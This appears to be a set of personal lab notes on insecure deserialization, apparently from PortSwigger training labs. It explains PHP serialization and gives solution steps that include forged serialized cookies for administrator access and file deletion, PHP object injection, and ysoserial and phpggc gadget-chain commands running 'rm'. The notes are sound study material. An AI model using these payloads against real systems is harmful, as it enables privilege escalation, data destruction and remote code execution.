When serialized, this object may look something like this:
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}

This can be interpreted as follows:

    O:4:"User" - An object with the 4-character class name "User"
    2 - the object has 2 attributes
    s:4:"name" - The key of the first attribute is the 4-character string "name"
    s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
    s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
    b:1 - The value of the second attribute is the boolean value true

The native methods for PHP serialization are serialize() and unserialize(). 
If you have source code access, you should start by looking for unserialize() anywhere in the code and investigating further

----------------------------------------------------------------------------------------------------------

#1 Lab: Modifying serialized object
 
    1. Turn intercept on, change email and send req to repeater.
    2. analyze the cookie and see admin from 0 to 1 and change back to base64.
    3. Modify the cookie in the chrome cookie section and its solved.


----------------------------------------------------------------------------------------------------

#2 Lab: Modifying serialized data types

     1. Send any request to repeater and analyze the cookie.
     2. Normal request : O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"d50lecyygdm54oihdadp5h939veq2er1";}
        Modified request: O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
     3. Things we hav changed is :-
        s= length of uname so change it accordingly of administrator
        removed access token and changed it to i:0 and modified its length to 12
    4. After modifying the cookie, we can see that we are logged in as administrator and we can access the admin panel on /admin path

----------------------------------------------------------------------------------------------------

#3 Lab: Using application functionality to exploit insecure deserialization
 
     1. Capture /my-account request and send to repeater and modify the request to /my-account/delete and send
     2. Normal request : O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h74kq9j39tegavxi3d2z9f2p9i3u9avx";s:11:"avatar_link";s:19:"users/wiener/avatar";}
        Modified request : O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h74kq9j39tegavxi3d2z9f2p9i3u9avx";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

#4 Lab: Arbitrary object injection in PHP

     1. Go to sitemap and from there send CustomTemplate.php to repeater 
     2. Aftr fil.php add ~ and see the response
     3. Send /my-account request to repeater and moidfy the centralised object to :-
        O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
        Normal request : O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pus7qsaoho8lbpds4pq7of0f4fz9jbtn";}


-------------------------------------------------------------------------------------------------------------------------------------

#5 Lab : Exploiting Java deserialization with Apache Commons

      1. Send the request to repeater and analyze the cookie
      2. In wsl run:-
            java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0

      3. Copy the o/p in place of cookie and url encode and send the request and lab is solved

--------------------------------------------------------------------------------------------------------------------------------------

#6 Lab:  Exploiting PHP deserialization with a pre-built gadget chain

      1. Send the request to repeater and decode the cookie to base64
      2. In cookie change the username to carlos and encode again as base64 and paste it in place of cookie
      3. In wsl run:-
            cd phpggc
             ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
      4. Copy the token and go to laburl/cgi-bin/phpinfo.php and collect secret from there